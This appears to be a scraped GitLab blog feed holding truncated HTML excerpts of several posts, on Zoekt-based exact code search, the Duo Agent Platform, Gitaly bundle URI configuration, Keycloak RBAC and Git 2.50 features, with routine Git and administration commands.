<strong>tUs</strong>, <strong>Use</strong>, <strong>ser</strong>, <strong>erI</strong>, <strong>rId</strong>, <strong>Id(&quot;, &quot;d()</strong>, all in the correct sequence and position. This ensures that only exact matches are returned.</p>\n<p>The result? Search queries that previously returned hundreds of irrelevant results now return only the precise matches you're looking for. This was <a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/325234\">one of our most requested features</a> for good reason - developers were losing significant time sifting through false positives.</p>\n<h3>Regular expression performance at scale</h3>\n<p>Zoekt excels at exact matches and is optimized for regular expression searches. The engine uses sophisticated algorithms to convert regex patterns into efficient trigram queries when possible, maintaining speed even for complex patterns across terabytes of code.</p>\n<h2>Built for enterprise scale</h2>\n<p>Exact Code Search is powerful and built to handle massive scale with impressive performance. This is not just a new UI feature — it's powered by a completely reimagined backend architecture.</p>\n<h3>Handling terabytes of code with ease</h3>\n<p>On GitLab.com alone, our Exact Code Search infrastructure indexes and searches over <strong>48 TB</strong> of code data while maintaining lightning-fast response times. This scale represents millions of repositories across thousands of namespaces, all searchable within milliseconds. To put this in perspective: This scale represents more code than the entire Linux kernel, Android, and Chromium projects combined. Yet Exact Code Search can find a specific line across this massive codebase in milliseconds.</p>\n<h3>Self-registering node architecture</h3>\n<p>Our innovative implementation features:</p>\n<ul>\n<li><strong>Automatic node registration:</strong> Zoekt nodes register themselves with GitLab</li>\n<li><strong>Dynamic shard assignment:</strong> The system automatically assigns namespaces to nodes</li>\n<li><strong>Health monitoring:</strong> Nodes that don't check in are automatically marked offline</li>\n</ul>\n<p>This self-configuring architecture dramatically simplifies scaling. When more capacity is needed, administrators can simply add more nodes without complex reconfiguration.</p>\n<h3>Distributed system with intelligent load balancing</h3>\n<p>Behind the scenes, Exact Code Search operates as a distributed system with these key components:</p>\n<ul>\n<li><strong>Specialized search nodes:</strong> Purpose-built servers that handle indexing and searching</li>\n<li><strong>Smart sharding:</strong> Code is distributed across nodes based on namespaces</li>\n<li><strong>Automatic load balancing:</strong> The system intelligently distributes work based on capacity</li>\n<li><strong>High availability:</strong> Multiple replicas ensure continuous operation even if nodes fail</li>\n</ul>\n<p><em>Note: High availability is built into the architecture but not yet fully enabled. See <a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/514736\">Issue 514736</a> for updates.</em></p>\n<h3>Seamless security integration</h3>\n<p>Exact Code Search automatically integrates with GitLab's permission system:</p>\n<ul>\n<li>Search results are filtered based on the user's access rights</li>\n<li>Only code from projects the user has access to is displayed</li>\n<li>Security is built into the core architecture, not added as an afterthought</li>\n</ul>\n<h3>Optimized performance</h3>\n<ul>\n<li><strong>Efficient indexing:</strong> Large repositories are indexed in tens of seconds</li>\n<li><strong>Fast query execution:</strong> Most searches return results with sub-second response times</li>\n<li><strong>Streaming results:</strong> The new gRPC-based federated search streams results as they're found</li>\n<li><strong>Early termination:</strong> Once enough results are collected, the system pauses searching</li>\n</ul>\n<h2>From library to distributed system: Engineering challenges we solved</h2>\n<p>While Zoekt provided the core search technology, it was originally designed as a minimal library for managing <code>.zoekt</code> index files - not a distributed database or enterprise-scale service. Here are the key engineering challenges we overcame to make it work at GitLab's scale&quot;</p>\n<h3>Challenge 1: Building a orchestration layer</h3>\n<p><strong>The problem:</strong> Zoekt was designed to work with local index files, not distributed across multiple nodes serving many concurrent users.</p>\n<p><strong>Our solution:</strong> We built a comprehensive orchestration layer that:</p>\n<ul>\n<li>Creates and manages database models to track nodes, indices, repositories, and tasks</li>\n<li>Implements a self-registering node architecture (inspired by GitLab Runner)</li>\n<li>Handles automatic shard assignment and load balancing across nodes</li>\n<li>Provides bidirectional API communication between GitLab Rails and Zoekt nodes</li>\n</ul>\n<h3>Challenge 2: Scaling storage and indexing</h3>\n<p><strong>The problem:</strong> How do you efficiently manage terabytes of index data across multiple nodes while ensuring fast updates?</p>\n<p><strong>Our solution:</strong> We implemented:</p>\n<ul>\n<li>Intelligent sharding: Namespaces are distributed across nodes based on capacity and load</li>\n<li>Independent replication: Each node independently indexes from <a href=\"https://gitlab.com/gitlab-org/gitaly\">Gitaly</a> (our Git storage service), eliminating complex synchronization</li>\n<li>Watermark management: Sophisticated storage allocation that prevents nodes from running out of space</li>\n<li>Unified binary architecture: A single <code>gitlab-zoekt</code> binary that can operate in both indexer and webserver modes</li>\n</ul>\n<h3>Challenge 3: Permission Integration</h3>\n<p><strong>The problem:</strong> Zoekt had no concept of GitLab's complex permission system - users should only see results from projects they can access.</p>\n<p><strong>Our solution:</strong> We built native permission filtering directly into the search flow:</p>\n<ul>\n<li>Search requests include user permission context</li>\n<li>Results are filtered to include only those the user can access in case permissions change before indexing completes</li>\n</ul>\n<h3>Challenge 4: Operational simplicity</h3>\n<p><strong>The problem:</strong> Managing a distributed search system shouldn't require a dedicated team.</p>\n<p><strong>Our solution:</strong></p>\n<ul>\n<li>Auto-scaling: Adding capacity is as simple as deploying more nodes - they automatically register and start handling work</li>\n<li>Self-healing: Nodes that don't check in are automatically marked offline and their work redistributed</li>\n<li>Zero-configuration sharding: The system automatically determines optimal shard assignments</li>\n</ul>\n<h2>Gradual rollout: Minimizing risk at scale</h2>\n<p>Rolling out a completely new search backend to millions of users required careful planning. Here's how we minimized customer impact while ensuring reliability:</p>\n<h3>Phase 1: Controlled testing (gitlab-org group)</h3>\n<p>We started by enabling Exact Code Search only for the <code>gitlab-org</code> group - our own internal repositories. This allowed us to:</p>\n<ul>\n<li>Test the system with real production workloads</li>\n<li>Identify and fix performance bottlenecks</li>\n<li>Streamline the deployment process</li>\n<li>Learn from real users' workflows and feedback</li>\n</ul>\n<h3>Phase 2: Performance validation and optimization</h3>\n<p>Before expanding, we focused on ensuring the system could handle GitLab.com's scale:</p>\n<ul>\n<li>Implemented comprehensive monitoring and alerting</li>\n<li>Validated storage management with real production data growth</li>\n</ul>\n<h3>Phase 3: Incremental customer expansion</h3>\n<p>We gradually expanded to customers interested in testing Exact Code Search:</p>\n<ul>\n<li>Gathered feedback on performance and user experience</li>\n<li>Refined the search UI based on real user workflows</li>\n<li>Optimized indexing performance (large repositories like <code>gitlab-org/gitlab</code> now index in ~10 seconds)</li>\n<li>Refined the architecture based on operational learnings</li>\n<li>Massively increased indexing throughput and improved state transition livecycle</li>\n</ul>\n<h3>Phase 4: Broad rollout</h3>\n<p>Today, over 99% of Premium and Ultimate licensed groups on GitLab.com have access to Exact Code Search. Users can:</p>\n<ul>\n<li>Toggle between regex and exact search modes</li>\n<li>Experience the benefits without any configuration changes</li>\n<li>Fall back to the previous search if needed (though few choose to)</li>\n</ul>\n<p>Rolling this out gradually meant users didn't experience service disruptions, performance degradation, or feature gaps during the transition. We've already received positive feedback from users as they notice their results becoming more relevant and faster.</p>\n<blockquote>\n<p><strong>For technical deep dive:</strong> Interested in the detailed architecture and implementation?

      "summary": "<p>I’m thrilled to introduce the next evolution of Duo Workflow: GitLab Duo Agent Platform. This innovative platform extends agentic capabilities across the software development lifecycle, enabling teams to work in parallel with multiple AI agents.</p>\n<p>Imagine starting your day like this:</p>\n<ul>\n<li>You assign one AI agent to conduct deep research on an epic your team is working on, provide the latest updates on all contributions from the past week, and suggest a release post based on recent feature additions.</li>\n<li>In parallel, you delegate a handful of accessibility bugs to several agents for analysis and to make the necessary code changes to resolve them.</li>\n<li>Meanwhile, you ask another agent to review your complicated code changes and provide feedback before sending them to your teammate for formal review.</li>\n<li>Finally, when the security team pings you about a new vulnerability that needs investigation across your entire project, you hand that research task to your security agent.</li>\n</ul>\n<p>All of this happens simultaneously, while you focus on architecture decisions, creative problem-solving, and strategic technical work. GitLab Duo Agent Platform will let you delegate tasks to five, 10, or even 100 specialized agents — all with full context of your project, not just your code, including CI job logs, planning work items, and so much more. You’re automating the tedious work you have to do, so you can focus on the work that inspires you.</p>\n<p><strong>This isn't about replacing developers. It's about amplifying human creativity and expertise by removing the friction from routine tasks.</strong> That’s the future we’re building with GitLab Duo Agent Platform.</p>\n<h2>What is GitLab Duo Agent Platform?</h2>\n<p>GitLab Duo Agent Platform will enable many-to-many collaboration between engineers and <a href=\"https://about.gitlab.com/topics/agentic-ai/\">AI agents</a> across the full software development lifecycle, designed to help teams dramatically improve productivity and cycle time.</p>\n<p>Built on GitLab’s secure foundation, GitLab Duo Agent Platform is customizable and extendable. It empowers developers to build agents to tackle all kinds of software engineering problems, leveraging context across your entire software development lifecycle.</p>\n<p>GitLab Duo Agent Platform will go beyond code creation with specialized agents and custom workflows that can help with a nearly unlimited list of activities, including:</p>\n<ul>\n<li>Issue implementation</li>\n<li>Large-scale migrations/dependency upgrades</li>\n<li>Automated documentation building/release posts</li>\n<li>Fixing broken pipelines</li>\n<li>Incident research support</li>\n<li>Deep research of status and information on topics</li>\n<li>Backlog administration</li>\n<li>Vulnerability resolution</li>\n<li>Reviews for specific types of code (e.g. database)</li>\n<li>Quick internal tool building based on existing build blocks</li>\n<li>and many more!</li>\n</ul>\n<p>You will be able to use our agents out of the box as well as customize and extend them. We’re currently beta testing GitLab Duo Agent Platform with dozens of customers and will open beta access to more teams soon.</p>\n<p>Watch GitLab Duo Agent Platform in action:\n&lt;div style=&quot;padding:56.25% 0 0 0;position:relative;&quot;&gt;&lt;iframe src=&quot;https://player.vimeo.com/video/1095679084?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share&quot; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%;&quot; title=&quot;Agent Platform Demo Clip&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;script src=&quot;https://player.vimeo.com/api/player.js&quot;&gt;&lt;/script&gt;</p>\n<h2>Choose your tools, your models, and your agents</h2>\n<p>Consistent with GitLab’s commitment to being an open platform, GitLab agents will seamlessly interoperate with your choice of code-authoring developer tools via standard model context protocol (MCP) and the agent-to-agent (A2A) framework, whether you’re using Cursor, Claude Code, Windsurf, OpenAI Codex, or others.</p>\n<p>The platform will accept code contributions from any development tool in your stack, whether that code was written by a human developer or generated by an AI agent. This means your existing workflows and preferred tools will continue to work seamlessly as you integrate agent capabilities.</p>\n<p>GitLab Duo Agent Platform will work with any approved language model that <a href=\"https://about.gitlab.com/ai-transparency-center/#ai-continuity-plan\">meets our selection criteria</a>. For organizations with strict security requirements, it will support approved self-hosted models running in completely air-gapped environments. Your infrastructure requirements and security policies won’t limit your ability to benefit from agentic development.</p>\n<h2>Context is everything, and your GitLab Duo agents have it</h2>\n<p>The difference between a helpful AI tool and a truly intelligent agent comes down to context. With GitLab Duo Agent Platform, agents don't work in isolation — they're deeply integrated into the platform where development work happens.</p>\n<p>Every agent will automatically understand the full picture of your projects, including your open issues and their history, the merge requests that resolved them, the structure and rationale behind your code, your CI/CD pipeline configurations, security findings, compliance requirements, and the intricate relationships between all these components.</p>\n<p>Just like your human team members, agents have all the context to help you ship secure software faster. Instead of just answering questions about code, they will be able to provide insights about how a proposed change might affect your deployment pipeline or suggest security improvements based on your existing compliance rules. We believe that the more your team works within GitLab’s DevSecOps platform, the smarter your agents will become.</p>\n<h2>Stay in control while agents scale your team</h2>\n<p>Building trust with AI agents isn't fundamentally different from building trust with new team members. You need to see their work, understand their approach, and gradually increase their responsibilities as they prove their competence.</p>\n<p>That's the philosophy behind our agent approval workflow. Before any agent makes changes to your code or environment, it will present you with a clear plan: what it understands about the issue, the approach it will take, and the specific actions it wants to perform. You’ll then get the opportunity to review, approve, or redirect as needed. Over time, as agents consistently deliver quality work, you will be able to grant them greater autonomy for routine tasks while maintaining oversight for complex or critical work.</p>\n<h2>Built for community and customization</h2>\n<p>GitLab has always thrived on community contributions, and this year marked a milestone with record-breaking customer contributions to our platform. Now we're extending that same collaborative energy to AI agents through our open framework approach.</p>\n<p>GitLab Duo Agent Platform isn't just about the agents we build — it's about empowering you and the broader community to create specialized agents that solve your unique engineering challenges. Whether you need an agent that understands your specific coding standards, integrates with your custom toolchain, or handles domain-specific tasks, the platform will give you the building blocks to make it happen.</p>\n<p>This community-driven model creates a virtuous cycle that leverages the strength of the GitLab community through global sharing, similar to our <a href=\"https://about.gitlab.com/blog/ci-cd-catalog-goes-ga-no-more-building-pipelines-from-scratch/\">CI/CD Catalog</a>. Diverse real-world use cases drive innovation. Enterprise feedback ensures reliability and security. And shared solutions benefit everyone. It's the same collaborative approach that has made GitLab successful, now applied to the frontier of agentic development.</p>\n<h2>How to get started</h2>\n<p>If you've been experimenting with <a href=\"https://about.gitlab.com/blog/2025/05/29/gitlab-duo-chat-gets-agentic-ai-makeover/\">GitLab Duo Agentic Chat</a>, now included with every GitLab 18 Premium and Ultimate GitLab.com user license, you've already gotten a taste of what's possible with AI agents in your development workflow.</p>\n<p>To see what GitLab Duo Agent Platform can do and what we’re working on, check out the <a href=\"https://about.gitlab.com/eighteen/\">demos in the recording of our annual GitLab 18 release event</a>.</p>\n<p>Want to be among the first to experience it?

      "link": "https://about.gitlab.com/blog/reduce-the-load-on-gitlab-gitaly-with-bundle-uri/",
      "published": "2025-06-24T00:00:00.000Z",
      "summary": "<p>Gitaly plays a vital role in the GitLab ecosystem — it is the server\ncomponent that handles all Git operations. Every push and pull made to/from\na repository is handled by Gitaly, which has direct access to the disk where\nthe actual repositories are stored. As a result, when Gitaly is under heavy\nload, some operations like CI/CD pipelines and browsing a repository in the\nGitLab UI can become quite slow. This is particularly true when serving\nclones and fetches for large and busy monorepos, which can consume large\namounts of CPU and memory.</p>\n<p><a href=\"https://docs.gitlab.com/administration/gitaly/bundle_uris/\">Bundle URI</a> takes significant load off of Gitaly servers during clones by allowing Git to pre-download a bundled repository from object storage before calling the Gitaly servers to fetch the remaining objects.</p>\n<p>Here is a graph that shows the difference between clones without and with bundle URI.</p>\n<p><img alt=\"Graph that shows the difference between clones without and with bundle URI\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1750705069/rvbm4ru1w58msd6zv4x7.png\" /></p>\n<p>This graph shows the results of a small test we ran on an isolated GitLab installation, with Gitaly running on a machine with 2 CPUs. We wanted to test bundle URI with a large repository, so we pushed the <a href=\"https://gitlab.com/gitlab-org/gitlab\">GitLab repository</a> to the instance. We also generated a bundle beforehand.</p>\n<p>The big CPU spike is from when we performed a single clone of the GitLab repository with bundle URI disabled. It's quite noticeable. A little later, we turned on bundle URI and launched three concurrent clones of the GitLab repository. Sure enough, turning on bundle URI provides massive performance gain. We can't even distinguish the CPU usage of the three clones from normal usage.</p>\n<h2>Configure Gitaly to use bundle URI</h2>\n<p>To enable bundle URI on your GitLab installation, there are a couple of things you need to configure.</p>\n<h3>Create a cloud bucket</h3>\n<p>Bundles need to be stored somewhere. The ideal place is in a cloud storage bucket. Gitaly uses the <a href=\"https://pkg.go.dev/gocloud.dev\">gocloud.dev</a> library to read and write from cloud storage. Any cloud storage solution supported by this library can be used. Once you have a cloud bucket URL, you can add it in the Gitaly configuration here:</p>\n<pre><code class=\"language-toml\">[bundle_uri]\ngo_cloud_url = &quot;&lt;bucket-uri&gt;&quot;\n</code></pre>\n<p>It must be noted that Gitaly does not manage the lifecycle of the bundles stored in the bucket. To avoid cost issues, object lifecycle policies must be enabled on the bucket in order to delete unused or old objects.</p>\n<h3>Enable the feature flags</h3>\n<p>There are two feature flags to enable:</p>\n<ul>\n<li>\n<p><code>gitaly_bundle_generation</code> enables <a href=\"https://about.gitlab.com/atom.xml#auto-generated\">auto-generation</a> of bundles.</p>\n</li>\n<li>\n<p><code>gitaly_bundle_uri</code> makes Gitaly advertise bundle URIs when they are available (either manually created or auto-generated) and allows the user to <a href=\"https://about.gitlab.com/atom.xml#manual\">manually</a> generate bundles.</p>\n</li>\n</ul>\n<p>These feature flags can be enabled at-large on a GitLab installation, or per repository. See the <a href=\"https://docs.gitlab.com/administration/feature_flags/#how-to-enable-and-disable-features-behind-flags\">documentation on how to enable a GitLab feature behind a feature flag</a>.</p>\n<h3>How to generate bundles</h3>\n<p>Gitaly offers two ways for users to use bundle URI: a <a href=\"https://about.gitlab.com/atom.xml#manual\">manual</a> way and an <a href=\"https://about.gitlab.com/atom.xml#auto-generated\">auto-generated</a> way.</p>\n<h4>Manual</h4>\n<p>It is possible to create a bundle manually by connecting over SSH with the Gitaly node that stores the repository you want to create a bundle for, and run the following command:</p>\n<pre><code class=\"language-shell\">sudo -u git -- /opt/gitlab/embedded/bin/gitaly bundle-uri \n--config=&lt;config-file&gt;\n--storage=&lt;storage-name&gt;\n--repository=&lt;relative-path&gt;\n</code></pre>\n<p>This command will create a bundle for the given repository and store it into the bucket configured above. When a subsequent <code>git clone</code> request will reach Gitaly for the same repository, the bundle URI mechanism described above will come into play.</p>\n<h4>Auto-generated</h4>\n<p>Gitaly can also generate bundles automatically, using a heuristic to determine if it is currently handling frequent clones for the same repository.</p>\n<p>The current heuristic keeps track of the number of times a <code>git fetch</code> request is issued for each repository. If the number of requests reaches a certain <code>threshold</code> in a given time <code>interval</code>, a bundle is automatically generated. Gitaly also keeps track of the last time it generated a bundle for a repository. When a new bundle should be regenerated, based on the <code>threshold</code> and <code>interval</code>, Gitaly looks at the last time a bundle was generated for the given repository. It will only generate a new bundle if the existing bundle is older than some <code>maxBundleAge</code> configuration. The old bundle is overwritten. There can only be one bundle per repository in cloud storage.</p>\n<h2>Using bundle URI</h2>\n<p>When a bundle exists for a repository, it can be used by the <code>git clone</code> command.</p>\n<h3>Cloning from your terminal</h3>\n<p>To clone a repository from your terminal, make sure your Git configuration enables bundle URI. The configuration can be set like so:</p>\n<pre><code class=\"language-shell\">git config --global transfer.bundleuri true\n</code></pre>\n<p>To verify that bundle URI is used during a clone, you can run the <code>git clone</code> command with <code>GIT_TRACE=1</code> and see if your bundle is being downloaded:</p>\n<pre><code class=\"language-shell\">➜  GIT_TRACE=1 git clone https://gitlab.com/gitlab-org/gitaly\n...\n14:31:42.374912 run-command.c:667       trace: run_command: git-remote-https '&lt;bundle-uri&gt;'\n...\n</code></pre>\n<h3>Cloning during CI/CD pipelines</h3>\n<p>One scenario where using bundle URI would be beneficial is during a CI/CD pipeline, where each job needs a copy of the repository in order to run. Cloning a repository during a CI/CD pipeline is the same as cloning a repository from your terminal, except that the Git client in this case is the GitLab Runner. Thus, we need to configure the GitLab Runner in such a way that it can use bundle URI.</p>\n<p><strong>1. Update the helper-image</strong></p>\n<p>The first thing to do to configure the GitLab Runner is to <a href=\"https://docs.gitlab.com/runner/configuration/advanced-configuration/#override-the-helper-image\">overwrite the helper-image</a> that your GitLab Runner instances use. The <code>helper-image</code> is the image that is used to run the process of cloning a repository before the job starts. To use bundle URI, the image needs the following:</p>\n<ul>\n<li>\n<p>Git Version 2.49.0 or later</p>\n</li>\n<li>\n<p><a href=\"https://gitlab.com/gitlab-org/gitlab-runner/-/tree/main/apps/gitlab-runner-helper?ref_type=heads\"><code>GitLab Runner helper</code></a> Version 18.1.0 or later</p>\n</li>\n</ul>\n<p>The helper-images can be found <a href=\"https://gitlab.com/gitlab-org/gitlab-runner/container_registry/1472754?orderBy=PUBLISHED_AT&amp;sort=desc&amp;search%5B%5D=v18.1.0\">here</a>. Select an image that corresponds to the OS distribution and the architecture you use for your GitLab Runner instances, and verify that the image satisfies the requirements.</p>\n<p>At the time of writing, the <code>alpine-edge-&lt;arch&gt;-v18.1.0*</code> tag meets all requirements.</p>\n<p>You can validate the image meets all requirements with:</p>\n<pre><code class=\"language-shell\">docker run -it &lt;image:tag&gt;\n$ git version ## must be 2.49.0 or newer\n$ gitlab-runner-helper -v ## must be 18.0 or newer\n</code></pre>\n<p>If you do not find an image that meets the requirements, you can also use the helper-image as a base image and install the requirements yourself in a custom-built image that you can host on <a href=\"https://docs.gitlab.com/user/packages/container_registry/\">GitLab Container Registry</a>.</p>\n<p>Once you have found the image you need, you must configure your GitLab Runner instances to use it by updating your <code>config.toml</code> file:</p>\n<pre><code class=\"language-toml\">[[runners]]\n (...)\n executor = &quot;docker&quot;\n [runners.docker]\n    (...)\n    helper_image = &quot;image:tag&quot; ## &lt;-- put the image name and tag here\n</code></pre>\n<p>Once the configuration is changed, you must restart the runners for the new configuration to take effect.</p>\n<p><strong>2. Turn on the feature flag</strong></p>\n<p>Next, you must enable the <code>FF_USE_GIT_NATIVE_CLONE</code> <a href=\"https://docs.gitlab.com/runner/configuration/feature-flags/\">GitLab Runner feature flags</a> in your <code>.gitlab-ci.yml</code> file. To do that, simply add it as a variable and set to <code>true</code> :</p>\n<pre><code class=\"language-yaml\">variables:\n  FF_USE_GIT_NATIVE_CLONE: &quot;true&quot;\n</code></pre>\n<p>The <code>GIT_STRATEGY</code> must also be <a href=\"https://docs.gitlab.com/ci/runners/configure_runners/#git-strategy\">set to <code>clone</code></a>, as Git bundle URI only works with <code>clone</code> commands.</p>\n<h2>How bundle URI works</h2>\n<p>When a user clones a repository with the <code>git clone</code> command, a process called <a href=\"https://git-scm.com/docs/git-receive-pack\"><code>git-receive-pack</code></a> is launched on the client's machine. This process communicates with the remote repository's server (it can be over HTTP/S, SSH, etc.) and asks to start a <a href=\"https://git-scm.com/docs/git-receive-pack\"><code>git-upload-pack</code></a> process. Those two processes then exchange information using the Git protocol (it must be noted that bundle URI is only supported with <a href=\"https://git-scm.com/docs/protocol-v2\">Git protocol v2</a>). The capabilities both processes support and the references and objects the client needs are among the information exchanged. Once the Git server has determined which objects to send to the client, it must package them into a packfile, which, depending on the size of the data it must process, can consume a good amount of resources.</p>\n<p>Where does bundle URI fit into this interaction? If bundle URI is advertised as a capability from the <code>upload-pack</code> process and the client supports bundle URI, the Git client will ask the server if it knows about any bundle URIs. The server sends those URIs back and the client downloads those bundles.</p>\n<p>Here is a diagram that shows those interactions:</p>\n<pre><code class=\"language-mermaid\">\nsequenceDiagram\n\n\n    participant receive as Client\n\n\n    participant upload as Server\n\n\n    participant cloud as File server\n\n\n    receive -&gt;&gt; upload: issue git-upload-pack\n\n\n    upload --&gt;&gt; receive: list of server capabilities\n\n\n    opt if bundle URI is advertised as a capability\n\n\n    receive -&gt;&gt; upload: request bundle URI\n\n\n    upload --&gt;&gt; receive: bundle URI\n\n\n    receive -&gt;&gt; cloud: download bundle at URI\n\n\n    cloud --&gt;&gt; receive: bundle file\n\n\n    receive -&gt;&gt; receive: clone from bundle\n\n\n    end\n\n\n    receive -&gt;&gt; upload: requests missing references and objects\n\n\n    upload --&gt;&gt; receive: packfile data\n\n</code></pre>\n<p>As such, Git <a href=\"https://git-scm.com/docs/bundle-uri\">bundle URI</a> is a mechanism by which, during a <code>git clone</code>, a Git server can advertise the URI of a bundle for the repository being cloned by the Git client. When that is the case, the Git client can clone the repository from the bundle and request from the Git server only the missing references or objects that were not part of the bundle. This mechanism really helps to alleviate pressure from the Git server.</p>\n<h2>Alternatives</h2>\n<p>GitLab also has a feature <a href=\"https://docs.gitlab.com/administration/gitaly/configure_gitaly/#pack-objects-cache\">Pack-objects cache</a>. This feature works slightly differently than bundle URI. When the server packs objects together into a so-called packfile, this feature will keep that file in the cache. When another client needs the same set of objects, it doesn't need to repack them, but it can just send the same packfile again.</p>\n<p>The feature is only beneficial when many clients request the exact same set of objects. In a repository that is quick-changing, this feature might not give any improvements. With bundle URI, it doesn't matter if the bundle is slightly out-of-date because the client can request missing objects after downloading the bundle and apply those changes on top. Also bundle URI in Gitaly stores the bundles on external storage, which the Pack-objects Cache stores them on the Gitaly node, so using the latter doesn't reduce network and I/O load on the Gitaly server.</p>\n<h2>Try bundle URI today</h2>\n<p>You can try the bundle URI feature in one of the following ways:</p>\n<ul>\n<li>\n<p>Download a <a href=\"https://about.gitlab.com/free-trial/\">free, 60-day trial version of GitLab Ultimate</a>.</p>\n</li>\n<li>\n<p>If you already run a self-hosted GitLab installation, upgrade to 18.1.</p>\n</li>\n<li>\n<p>If you can't upgrade to 18.1 at this time, <a href=\"https://about.gitlab.com/install/\">download GitLab</a> to a local machine.</p>\n</li>\n</ul>",

These roles have been mapped to GitLab access levels via OIDC claims, while group affiliations align with GitLab’s structured hierarchy of root groups, sub-groups, and projects.</p>\n<p>Upon login through GitLab’s SSO Keycloak endpoint, the user is automatically provisioned into the correct group and assigned the appropriate role — with no manual intervention.</p>\n<p>Within GitLab, you can see that the  user can interact with the assigned project: For example, a developer might push code and open a merge request, but not merge to protected branches — validating the least-privilege model.</p>\n<p>Finally, you can showcase access across multiple teams or products that are managed centrally in Keycloak, yet enforced precisely in GitLab through group sync and permissions inheritance. This demo illustrates not just role assignment, but how GitLab and Keycloak together deliver real-time, automated access governance at scale — ready for secure, compliant, enterprise-grade software development.</p>\n<h2>Why GitLab?</h2>\n<p>GitLab’s comprehensive, intelligent DevSecOps platform is the ideal foundation for secure, scalable access management. With native OIDC support, granular role enforcement, SCIM-based user provisioning, and built-in audit logging, GitLab allows organizations to centralize control without compromising agility. Its flexible group hierarchy mirrors enterprise structure, making it easy to manage access across teams.</p>\n<p>Integrating with identity providers like Keycloak automates onboarding, ensures least-privilege access, and creates a seamless identity-to-permission pipeline that supports regulatory and security goals. As a core component of GitLab’s security capabilities, RBAC ties directly into CI/CD, policy enforcement, and vulnerability management workflows.</p>\n<h2>Summary</h2>\n<p>RBAC is just the beginning. With GitLab and Keycloak, you’re not just securing access — you’re enabling structured, automated governance that scales. As you expand into policy enforcement, Secure SDLC, and DevSecOps automation, this foundation becomes a launchpad for sustainable, enterprise-grade software delivery.</p>\n<blockquote>\n<p>Get started with RBAC in GitLab today with a free, 60-day trial of GitLab Ultimate. <a href=\"https://about.gitlab.com/free-trial/\">Sign up today</a>!</p>\n</blockquote>",

      "summary": "<p>The Git project recently released <a href=\"https://lore.kernel.org/git/xmqq1prj1umb.fsf@gitster.g/T/#u\">Git Version 2.50.0</a>. Let's look at a few notable highlights from this release, which includes contributions from the Git team at GitLab and also the wider Git community.</p>\n<h2>New git-diff-pairs(1) command</h2>\n<p>Diffs are at the heart of every code review and show all the changes made\nbetween two revisions. GitLab shows diffs in various places, but the most\ncommon place is a merge request's <a href=\"https://docs.gitlab.com/user/project/merge_requests/changes/\">&quot;Changes&quot; tab</a>.\nBehind the scenes, diff generation is powered by\n<a href=\"https://git-scm.com/docs/git-diff\"><code>git-diff(1)</code></a>. For example:</p>\n<pre><code class=\"language-shell\">$ git diff HEAD~1 HEAD\n</code></pre>\n<p>This command returns the full diff for all changed files. This might pose a scalability challenge because the number of files changed between a set of revisions could be very large and cause the command to reach self-imposed timeouts for the GitLab backend. For large change sets, it would be better if\nthere were a way to break diff computation into smaller, more digestible chunks.</p>\n<p>One way this can be achieved is by using\n<a href=\"https://git-scm.com/docs/git-diff-tree\"><code>git-diff-tree(1)</code></a> to retrieve info\nabout all the changed files:</p>\n<pre><code class=\"language-shell\">$ git diff-tree -r -M --abbrev HEAD~ HEAD\n:100644 100644 c9adfed339 99acf81487 M      Documentation/RelNotes/2.50.0.adoc\n:100755 100755 1047b8d11d 208e91a17f M      GIT-VERSION-GEN\n</code></pre>\n<p>Git refers to this output as the <a href=\"https://git-scm.com/docs/git-diff-tree#_raw_output_format\">&quot;raw&quot; format</a>.\nIn short, each line of output lists filepairs and the accompanying metadata\nabout what has changed between the start and end revisions. Compared to\ngenerating the &quot;patch&quot; output for large changes, this process is relatively\nquick and provides a summary of everything that changed. This command can optionally perform rename detection by  appending the <code>-M</code> flag to check if identified changes were due to a file rename.</p>\n<p>With this information, we could use <code>git-diff(1)</code> to compute each of the\nfilepair diffs individually. For example, we can provide the blob IDs\ndirectly:</p>\n<pre><code class=\"language-shell\">$ git diff 1047b8d11de767d290170979a9a20de1f5692e26 208e91a17f04558ca66bc19d73457ca64d5385f\n</code></pre>\n<p>We can repeat this process for each of the filepairs, but spinning up a\nseparate Git process for each individual file diff is not very efficient.\nFurthermore, when using blob IDs, the diff loses some contextual information\nsuch as the change status, and file modes which are stored in with the parent\ntree object. What we really want is a mechanism to feed &quot;raw&quot; filepair info and\ngenerate the corresponding patch output.</p>\n<p>With the 2.50 release, Git has a new built-in command named\n<a href=\"https://git-scm.com/docs/git-diff-pairs\"><code>git-diff-pairs(1)</code></a>. This command\naccepts &quot;raw&quot; formatted filepair info as input on stdin to determine exactly which patches to output. The following example showcases how this command could be\nused:</p>\n<pre><code class=\"language-shell\">$ git diff-tree -r -z -M HEAD~ HEAD | git diff-pairs -z\n</code></pre>\n<p>When used in this manner, the resulting output is identical to using <code>git-diff(1)</code>.\nBy having a separate command to generate patch output, the &quot;raw&quot; output from\n<code>git-diff-tree(1)</code> can be broken up into smaller batches of filepairs and fed to separate\n<code>git-diff-pairs(1)</code> processes. This solves the previously mentioned scalability\nconcern because diffs no longer have to be computed all at once. Future GitLab\nreleases could build upon this mechanism to improve diff\ngeneration performance, especially in cases where large change sets are\nconcerned. For more information on this change, check out the corresponding\n<a href=\"https://lore.kernel.org/git/20250228213346.1335224-1-jltobler@gmail.com/\">mailing-list thread</a>.</p>\n<p><em>This project was led by <a href=\"https://gitlab.com/justintobler\">Justin Tobler</a>.</em></p>\n<h2>Batched reference updates</h2>\n<p>Git provides the <a href=\"https://git-scm.com/docs/git-update-ref\"><code>git-update-ref(1)</code></a>\ncommand to perform reference updates. When used with the <code>--stdin</code> flag,\nmultiple reference updates can be batched together in a single transaction by\nspecifying instructions for each reference update to be performed on stdin.\nBulk updating references in this manner also provides atomic behavior whereby a\nsingle reference update failure results in an aborted transaction and no\nreferences being updated. Here is an example showcasing this behavior:</p>\n<pre><code class=\"language-shell\"># Create repository with three empty commits and branch named &quot;foo&quot;\n$ git init\n$ git commit --allow-empty -m 1\n$ git commit --allow-empty -m 2\n$ git commit --allow-empty -m 3\n$ git branch foo\n\n# Print out the commit IDs\n$ git rev-list 